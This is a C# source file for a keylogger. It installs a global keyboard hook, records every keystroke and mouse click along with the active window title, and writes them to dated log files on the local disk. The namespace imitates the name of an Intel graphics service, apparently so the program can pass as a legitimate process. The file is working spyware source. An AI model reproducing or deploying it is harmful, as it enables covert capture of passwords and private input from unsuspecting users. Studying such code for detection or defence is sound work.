using Keystroke.API;
using Keystroke.API.CallbackObjects;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace igfxCUIService
{
    class Keylogger
    {

        #region variable
        public static DateTime datum = DateTime.Now;
        private static string folderName = @"D:/keylogger/keylog";
        public static string pathString = System.IO.Path.Combine(folderName);
        public static string path = (pathString + "/" + datum.ToShortDateString() + ".text");
        public static String hWndTitle;
        public static String hWndTitlePast;
        public static KeystrokeAPI keystrokeApi = new KeystrokeAPI();
        #endregion

        #region keylogger
        public static void Logger()
        {
            hWndTitle = window.GetActiveWindowTitle();
            hWndTitlePast = hWndTitle;
             
            keystrokeApi.CreateKeyboardHook(Save);
            Application.Run();

        }
        #endregion

        #region save keylog
        private static void Save(KeyPressed key)
        {
            
            System.IO.Directory.CreateDirectory(pathString);
            
            using (StreamWriter sw = File.AppendText(path))
            {
                hWndTitle = window.GetActiveWindowTitle();
                
                if (hWndTitle != hWndTitlePast)
                {
                    sw.WriteLine(Environment.NewLine);
                    sw.WriteLine(datum);
                    sw.WriteLine(hWndTitle);
                    hWndTitlePast = hWndTitle;
                }
                if (hWndTitle == hWndTitlePast)
                {
                   
                    // dit moet nog verbeterd worden
                    if (key.KeyCode.ToString() == "LButton")
                    { sw.WriteLine("<LMouse>"); }
                    else if (key.KeyCode.ToString() == "RButton")
                    { sw.WriteLine("<RMouse>"); }
                    else if (key.KeyCode.ToString() == "Back")
                    { sw.WriteLine("<BackSpace>"); }
                    else if (key.KeyCode.ToString() == "Space")
                    { sw.Write(" "); }
                    else if (key.KeyCode.ToString() == "Return")
                    {
                        sw.WriteLine(Environment.NewLine);
                        sw.WriteLine(datum);
                        sw.WriteLine("<Enter>");
                    }
                    else if (key.KeyCode.ToString() == "Delete")
                    { sw.WriteLine("<Del>"); }
                    else if (key.KeyCode.ToString() == "Insert")
                    { sw.WriteLine("<Ins>"); }
                    else if (key.KeyCode.ToString() == "Home")
                    { sw.WriteLine("<Home>"); }
                    else if (key.KeyCode.ToString() == "End")
                    { sw.WriteLine("<End>"); }
                    else if (key.KeyCode.ToString() == "Tab")
                    { sw.WriteLine("<Tab>"); }
                    else if (key.KeyCode.ToString() == "Prior")
                    { sw.WriteLine("<Page Up>"); }
                    else if (key.KeyCode.ToString() == "PageDown")
                    { sw.WriteLine("<Page Down>"); }
                    else if (key.KeyCode.ToString() == "LWin" || key.KeyCode.ToString() == "RWin")
                    { sw.Write("<Win>"); }
                    else { sw.Write(key); }
                    
                }
            }
        }
        #endregion


    }
}
